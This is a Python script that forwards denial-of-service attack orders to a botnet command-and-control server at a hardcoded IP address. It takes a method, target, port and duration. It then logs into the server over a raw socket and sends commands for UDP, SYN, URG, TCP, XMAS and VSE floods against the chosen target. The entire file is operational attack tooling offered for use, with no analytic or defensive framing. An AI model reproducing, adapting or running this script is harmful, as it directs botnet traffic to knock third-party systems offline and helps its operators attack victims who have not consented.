import os
import sys
import time
import socket
import random

mylogin = random.randint(0,14)

method = sys.argv[1]
target = sys.argv[2]
port = sys.argv[3]
atktime = sys.argv[4]


lmao = ["thelogin1","thelogin2","thelogin3","thelogin4","thelogin5","thelogin6","thelogin7","thelogin8","thelogin9","thelogin10","thelogin11","thelogin12","thelogin13","thelogin14","thelogin15"]


host = "192.3.130.186"
CNCport = 667
username = (lmao[mylogin])
password = (lmao[mylogin])


raid1 = ". CUDP "+target+" "+port+" "+atktime+" 32 150 10 0"
raid2 = ". CUDP "+target+" 67 "+atktime+" 32 150 10 0"
syn = ". CTCP "+target+" "+port+" "+atktime+" 30 SYN 50 10"
urg = ". CTCP "+target+" "+port+" "+atktime+" 30 URG 50 10"
tcpall = ". CTCP "+target+" "+port+" "+atktime+" 30 ALL 50 10"
xmas = ". CXMAS "+target+" "+port+" "+atktime+" 30 80 10"
vse = ". CVSE "+target+" "+port+" "+atktime+" 32 1 10"
udp = ". CUDP "+target+" "+port+" "+atktime+" 32 400 10 0"

print(raid1)
print(syn)
print(xmas)
print(vse)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # setup socket to connect to CNC


if sys.argv[1] == "RAID":	
	try:
		s.connect((host, CNCport)) # connect to CNC to send attack
		time.sleep(1)
		s.send("\r\n".encode()) # send new line because of the IAC negotiation
		time.sleep(1)
		buf = s.recv(1024) # receive/
		s.send("{}\r\n".format("login").encode())
		time.sleep(1)
		s.send("{}\r\n".format(username).encode()) # login with username
		time.sleep(1) # sleep for a second to give cnc time to respond
		s.send("{}\r\n".format(password).encode()) # send password to complete login
		time.sleep(2)
		s.send("{}\r\n".format(raid1).encode())
		time.sleep(0.5)
		s.send("{}\r\n".format(raid2).encode()) # send attack.
		time.sleep(1)
		s.send("{}\r\n".format("logout").encode())
	except:
		print("fail")

elif sys.argv[1] == "UDP":
	try:
		s.connect((host, CNCport)) # connect to CNC to send attack
		time.sleep(1)
		s.send("\r\n".encode()) # send new line because of the IAC negotiation
		time.sleep(1)
		buf = s.recv(1024) # receive/
		s.send("{}\r\n".format("login").encode())
		time.sleep(1)
		s.send("{}\r\n".format(username).encode()) # login with username
		time.sleep(1) # sleep for a second to give cnc time to respond
		s.send("{}\r\n".format(password).encode()) # send password to complete login
		time.sleep(2)
		s.send("{}\r\n".format(udp).encode())
		time.sleep(0.5)
		s.send("{}\r\n".format("logout").encode())
	except:
		print("fail")

elif sys.argv[1] == "SYN":
	try:
		s.connect((host, CNCport)) # connect to CNC to send attack
		time.sleep(1)
		s.send("\r\n".encode()) # send new line because of the IAC negotiation
		time.sleep(1)
		buf = s.recv(1024) # receive/
		s.send("{}\r\n".format("login").encode())
		time.sleep(1)
		s.send("{}\r\n".format(username).encode()) # login with username
		time.sleep(1) # sleep for a second to give cnc time to respond
		s.send("{}\r\n".format(password).encode()) # send password to complete login
		time.sleep(2)
		s.send("{}\r\n".format(syn).encode())
		time.sleep(0.5)
		s.send("{}\r\n".format("logout").encode())
	except:
		print("fail")

elif sys.argv[1] == "URG":
	try:
		s.connect((host, CNCport)) # connect to CNC to send attack
		time.sleep(1)
		s.send("\r\n".encode()) # send new line because of the IAC negotiation
		time.sleep(1)
		buf = s.recv(1024) # receive/
		s.send("{}\r\n".format("login").encode())
		time.sleep(1)
		s.send("{}\r\n".format(username).encode()) # login with username
		time.sleep(1) # sleep for a second to give cnc time to respond
		s.send("{}\r\n".format(password).encode()) # send password to complete login
		time.sleep(2)
		s.send("{}\r\n".format(urg).encode())
		time.sleep(0.5)
		s.send("{}\r\n".format("logout").encode())
	except:
		print("fail")

elif sys.argv[1] == "UDP":
	try:
		s.connect((host, CNCport)) # connect to CNC to send attack
		time.sleep(1)
		s.send("\r\n".encode()) # send new line because of the IAC negotiation
		time.sleep(1)
		buf = s.recv(1024) # receive/
		s.send("{}\r\n".format("login").encode())
		time.sleep(1)
		s.send("{}\r\n".format(username).encode()) # login with username
		time.sleep(1) # sleep for a second to give cnc time to respond
		s.send("{}\r\n".format(password).encode()) # send password to complete login
		time.sleep(2)
		s.send("{}\r\n".format(udp).encode())
		time.sleep(0.5)
		s.send("{}\r\n".format("logout").encode())
	except:
		print("fail")

elif sys.argv[1] == "TCP":
	try:
		s.connect((host, CNCport)) # connect to CNC to send attack
		time.sleep(1)
		s.send("\r\n".encode()) # send new line because of the IAC negotiation
		time.sleep(1)
		buf = s.recv(1024) # receive/
		s.send("{}\r\n".format("login").encode())
		time.sleep(1)
		s.send("{}\r\n".format(username).encode()) # login with username
		time.sleep(1) # sleep for a second to give cnc time to respond
		s.send("{}\r\n".format(password).encode()) # send password to complete login
		time.sleep(2)
		s.send("{}\r\n".format(tcpall).encode())
		time.sleep(0.5)
		s.send("{}\r\n".format("logout").encode())
	except:
		print("fail")

elif sys.argv[1] == "XMAS":
	try:
		s.connect((host, CNCport)) # connect to CNC to send attack
		time.sleep(1)
		s.send("\r\n".encode()) # send new line because of the IAC negotiation
		time.sleep(1)
		buf = s.recv(1024) # receive/
		s.send("{}\r\n".format("login").encode())
		time.sleep(1)
		s.send("{}\r\n".format(username).encode()) # login with username
		time.sleep(1) # sleep for a second to give cnc time to respond
		s.send("{}\r\n".format(password).encode()) # send password to complete login
		time.sleep(2)
		s.send("{}\r\n".format(xmas).encode())
		time.sleep(0.5)
		s.send("{}\r\n".format("logout").encode())
	except:
		print("fail")

elif sys.argv[1] == "VSE":
	try:
		s.connect((host, CNCport)) # connect to CNC to send attack
		time.sleep(1)
		s.send("\r\n".encode()) # send new line because of the IAC negotiation
		time.sleep(1)
		buf = s.recv(1024) # receive/
		s.send("{}\r\n".format("login").encode())
		time.sleep(1)
		s.send("{}\r\n".format(username).encode()) # login with username
		time.sleep(1) # sleep for a second to give cnc time to respond
		s.send("{}\r\n".format(password).encode()) # send password to complete login
		time.sleep(2)
		s.send("{}\r\n".format(vse).encode())
		time.sleep(0.5)
		s.send("{}\r\n".format("logout").encode())
	except:
		print("fail")

else:
	print("nope wrong attack")
	time.sleep(2)